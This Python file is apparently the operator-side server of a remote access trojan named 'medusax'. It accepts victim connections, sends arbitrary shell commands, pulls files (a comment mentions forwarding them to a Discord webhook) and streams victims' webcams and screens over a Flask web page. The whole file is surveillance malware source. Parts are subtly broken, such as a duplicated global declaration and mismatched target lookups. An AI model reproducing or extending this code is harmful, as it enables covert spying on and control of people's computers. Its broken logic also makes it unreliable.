import socket
import threading
import subprocess
import os
import cv2
import pyautogui
import flask
from flask import Flask, Response, render_template

# Server Configuration
HOST = "0.0.0.0"
PORT = 9999
WEB_PORT = 5000
clients = {}
selected_client = None

def handle_client(conn, addr):
    global selected_client
    clients[addr] = conn
    if selected_client is None:
        selected_client = addr
    print(f"[+] New connection from {addr}")
    
    while True:
        try:
            command = input("medusax > ")
            if command.startswith("!set target"):
                ip = command.split(" ")[2]
                if ip in clients:
                    global selected_client
                    selected_client = ip
                    print(f"[*] Target set to {ip}")
            elif command.startswith("!remove target"):
                if selected_client == addr:
                    selected_client = None
                    print("[*] Target removed")
            elif command.startswith("!download"):
                filename = command.split(" ")[1]
                conn.sendall(command.encode())
                print("[ * ] Sending...")
                # Receive and send file to Discord webhook (not implemented here)
                print("[+] Sent!")
            elif command.startswith("!webcam_stream"):
                threading.Thread(target=start_webcam_server, args=(conn,)).start()
            elif command.startswith("!screen_stream"):
                threading.Thread(target=start_screen_server, args=(conn,)).start()
            else:
                conn.sendall(command.encode())
                print(conn.recv(1024).decode())
        except:
            print(f"[-] Connection lost with {addr}")
            del clients[addr]
            break

def start_webcam_server(conn):
    app = Flask(__name__)
    
    def generate():
        while True:
            conn.sendall(b"!webcam_stream")
            data = conn.recv(9999999)
            if not data:
                break
            yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + data + b'\r\n')
    
    @app.route('/')
    def index():
        return render_template("index.html")
    
    @app.route('/video_feed')
    def video_feed():
        return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
    
    app.run(host=HOST, port=WEB_PORT, debug=False)

def start_screen_server(conn):
    app = Flask(__name__)
    
    def generate():
        while True:
            conn.sendall(b"!screen_stream")
            data = conn.recv(9999999)
            if not data:
                break
            yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + data + b'\r\n')
    
    @app.route('/')
    def index():
        return render_template("index.html")
    
    @app.route('/screen_feed')
    def screen_feed():
        return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
    
    app.run(host=HOST, port=WEB_PORT, debug=False)

def server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen()
    print(f"[+] Server started on {HOST}:{PORT}")
    
    while True:
        conn, addr = server_socket.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

server()
